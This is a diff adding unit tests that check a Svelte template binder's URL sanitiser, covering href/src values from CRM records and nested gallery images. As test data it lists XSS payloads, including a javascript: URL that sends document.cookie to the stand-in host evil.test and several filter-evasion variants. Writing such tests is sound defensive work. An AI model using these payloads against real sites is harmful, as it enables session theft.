@@ -150,3 +150,99 @@ describe('placeholdersIn', () => {
     expect(placeholdersIn({ type: 'spacer', content: { height: 20 } })).toEqual([]);
   });
 });
+
+/**
+ * The third sink: a record value bound into an `href` or `src`.
+ *
+ * The rule at the top of `bind.ts` reasoned about two — a value going into
+ * `{@html}` is escaped, one going anywhere else is not, because Svelte escapes a
+ * text node. A URL attribute is neither, and Svelte will not neutralise
+ * `javascript:` in `href={…}`.
+ *
+ * The template is admin-authored, which is fine: an admin who can write an `html`
+ * block can already run script. The RECORD is not — a CRM contact, a form
+ * submission, an imported row — and it is what lands in the attribute.
+ */
+describe('URL sinks', () => {
+  test('a javascript: URL from a record does not reach an href', () => {
+    const template = { id: 'card', type: 'button', content: { href: '{{website}}' } };
+    for (const hostile of [
+      "javascript:fetch('//evil.test/'+document.cookie)",
+      'JaVaScRiPt:alert(1)',
+      '  javascript:alert(1)',
+      'java\tscript:alert(1)',
+      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
+      '//evil.test/steal',
+    ]) {
+      const bound = bindBlock(template, { website: hostile }, 0);
+      expect(bound.content.href, `hostile URL survived: ${hostile}`).toBe('');
+    }
+  });
+
+  test('ordinary URLs still work — the control', () => {
+    // Without this, a `safeUrl` that returned '' for everything would pass above
+    // and silently break every link on every record page.
+    const template = { id: 'card', type: 'button', content: { href: '{{site}}' } };
+    for (const ok of [
+      'https://example.test/page',
+      'http://example.test',
+      'mailto:a@example.test',
+      'tel:+40123456789',
+      '/about',
+      'about/us',
+      '#section',
+      '?q=1',
+      '/search?q=a:b',
+    ]) {
+      expect(bindBlock(template, { site: ok }, 0).content.href).toBe(ok);
+    }
+  });
+
+  test('every URL key the renderer binds is covered', () => {
+    // The list is only as good as this: each key, exercised through bindBlock.
+    for (const key of ['href', 'url', 'src', 'link', 'cta_url', 'button_url', 'image_url']) {
+      const bound = bindBlock(
+        { id: 'b', type: 'x', content: { [key]: '{{u}}' } },
+        { u: 'javascript:alert(1)' },
+        0,
+      );
+      expect(bound.content[key], `${key} is not covered by URL_KEYS`).toBe('');
+    }
+  });
+
+  test('a static block is untouched — only bound blocks carry record data', () => {
+    // An admin authoring a literal URL is exercising a capability they have.
+    // `bindBlock` is only reached for record-bound templates, and this asserts
+    // the substitution is what triggers the check, not the key name alone.
+    const bound = bindBlock(
+      { id: 'b', type: 'x', content: { href: 'https://example.test' } },
+      { unrelated: 1 },
+      0,
+    );
+    expect(bound.content.href).toBe('https://example.test');
+  });
+});
+
+describe('URL sinks — nested', () => {
+  test('a gallery image URL from a record is guarded too', () => {
+    // `{#each c.images as img}` … `<img src={img.url}>`. The property is nested
+    // one level below the block's own keys, and the URL check used to run only
+    // on those. HTML_KEYS was already consulted at every level; this was not.
+    const bound = bindBlock(
+      { id: 'g', type: 'gallery', content: { images: [{ url: '{{u}}', alt: 'x' }] } },
+      { u: 'javascript:alert(1)' },
+      0,
+    );
+    expect(bound.content.images[0].url).toBe('');
+    expect(bound.content.images[0].alt).toBe('x');
+  });
+
+  test('and a legitimate nested URL still survives', () => {
+    const bound = bindBlock(
+      { id: 'g', type: 'gallery', content: { images: [{ url: '{{u}}' }] } },
+      { u: 'https://cdn.example.test/a.png' },
+      0,
+    );
+    expect(bound.content.images[0].url).toBe('https://cdn.example.test/a.png');
+  });
+});
